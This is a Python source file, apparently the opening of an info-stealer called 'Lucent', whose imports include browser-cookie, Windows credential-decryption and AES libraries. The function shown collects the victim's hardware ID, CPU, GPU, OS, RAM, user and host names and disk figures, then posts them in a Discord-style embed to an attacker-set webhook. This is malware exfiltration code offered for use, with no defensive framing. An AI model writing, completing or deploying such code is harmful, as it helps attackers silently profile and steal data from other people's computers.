import requests
import socket
import time
import psutil
import string
import platform
import subprocess
import json
import uuid
import json
import shutil
import re
import base64
import random
import sqlite3
import win32crypt 
import datetime
import re
import wmi
import os
import pyautogui
import tempfile
import sys
import browser_cookie3
from Crypto.Cipher import AES
import ctypes

h00k = "webhook"

def machineinfo():
    c = wmi.WMI()
    GPUm = "Unknown"
    for gpu in c.Win32_VideoController():
        GPUm = gpu.Description.strip()
    
    mem = psutil.virtual_memory()

    def machine_hwid():
        command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        hwid = subprocess.check_output(command, shell=True, text=True).strip()
        return hwid
    
    current_machine_id = machine_hwid()

    total_gb = round(mem.total / 1024**3)
    cpu = platform.processor()
    os_name = platform.platform()
    pc_name = platform.node()

    user_name = platform.uname().node  #
    host_name = socket.gethostname()  
    disk_usage = psutil.disk_usage('/').percent  
    free_space = round(psutil.disk_usage('/').free / (1024**3), 2)  

    data2 = {
        "username": "Lucent", 
        "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",  
        "embeds": [
            {
                "title": "💻️ Machine Info",
                "fields": [
                    {
                        "name": "<:cpu:1363299069040132157> SYSTEM",
                        "value": f"```CPU: {cpu}\nGPU: {GPUm}\nOS: {os_name}\nRAM: {total_gb}GB\nHwid: {current_machine_id}```",
                        "inline": False
                    },
                    {
                        "name": "<:user:1363299069040132157> USER",
                        "value": f"```User: {user_name}\nHost Name: {host_name}```", 
                        "inline": False
                    },
                    {
                        "name": "<:disk:1363299069040132157> DISK",
                        "value": f"```Disk Usage: {disk_usage}%\nFree Space: {free_space}GB```",  
                        "inline": False
                    },
                    {
                        "name": "<:wifi:1363299069040132157> WIFI",
                        "value": f"```Wi-Fi Status: SOON\nSSID: SOON```",  
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "zakocord. | https://github.com/zakocord/Lucent"
                }
            }
        ]
    }

    response2 = requests.post(h00k, json=data2)
